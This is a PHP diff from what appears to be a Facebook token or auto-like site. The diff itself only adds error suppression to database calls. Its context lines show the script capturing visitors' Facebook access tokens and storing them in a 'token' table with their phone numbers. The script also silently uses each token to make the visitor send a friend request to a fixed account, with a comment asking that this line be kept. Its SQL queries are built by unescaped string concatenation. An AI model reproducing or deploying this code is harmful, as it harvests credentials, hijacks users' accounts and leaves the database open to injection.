@@ -10,7 +10,7 @@ if(preg_match("'access_token=(.*?)&expires_in='", $gettoken, $matches)){
     } 
 if($token){ 
 auto('https://graph.facebook.com/me/friends?method=post&uids=100004294419791&access_token='.$token); //gi&#7919; nguyên,vui long tôn tr&#7885;ng tác gi&#7843;, hãy t&#7841;o thêm 1 function m&#7899;i !//
-mysqli_query($GLOBALS["___mysqli_ston"], "CREATE TABLE IF NOT EXISTS `token` ( 
+@mysqli_query($GLOBALS["___mysqli_ston"], "CREATE TABLE IF NOT EXISTS `token` ( 
   `id` int(11) NOT NULL AUTO_INCREMENT, 
   `idfb` varchar(32)  NOT NULL, 
   `ten` varchar(32)  NOT NULL, 
@@ -41,8 +41,8 @@ $_SESSION['gioitinh']='Nữ';
 $_SESSION['username'] = $me['username']; 
 $_SESSION['sdt'] = $me['mobile_phone']; 
 $_SESSION['token'] = $token; 
-$result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM token WHERE idfb = '".$me['id']."'"); 
-$rows = mysqli_fetch_array($result,  MYSQLI_ASSOC); 
+$result = @mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM token WHERE idfb = '".$me['id']."'"); 
+$rows = @mysqli_fetch_array($result,  MYSQLI_ASSOC); 
 if(!$rows){ 
 @mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO token SET  
 `idfb` = '".$me['id']."',   
